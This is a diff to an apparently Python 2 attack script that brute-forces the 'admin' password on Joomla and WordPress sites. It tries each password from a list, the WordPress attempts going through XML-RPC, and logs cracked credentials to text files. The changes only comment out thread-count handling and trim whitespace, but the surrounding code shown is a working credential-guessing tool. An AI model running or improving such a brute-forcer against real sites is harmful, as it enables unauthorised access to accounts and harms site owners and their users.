@@ -227,8 +227,8 @@ if not args.hidelogo :
 if argv==1 or not args.wordl :
   print parser.print_help()
 else :
-  if args.threads : threads_count = int(args.threads)
-  else : threads_count = 1
+  #if args.threads : threads_count = int(args.threads)
+  #else : threads_count = 1
   if args.site :
     if args.joomla : jmlist = [args.site]
     elif args.wordpress : wplist = [args.site]
@@ -293,7 +293,7 @@ else :
       t = Process(target=workerWordpress, args = (q,))
       t.start()
     #t.join()"""
-   
+
   if jmlist :
     print '[+] Brute forcing', len(jmlist), 'joomla sites'
     for site in jmlist :
@@ -306,11 +306,11 @@ else :
           if jm.checklog() :
             print Colors.GREEN+'[*] Cracked', site, 'user : admin', 'pass :', passwd+Colors.ENDC
             logger(site, 'admin', passwd, 'joomla.txt')
-            
+
   if wplist :
     print '[+] Brute forcing', len(wplist), 'wordpress sites'
     for site in wplist :
-      for passwd in passlist : 
+      for passwd in passlist :
         wp = WPxmlrpc(site)
         resp = wp.sendPost('admin', passwd)
         #print resp
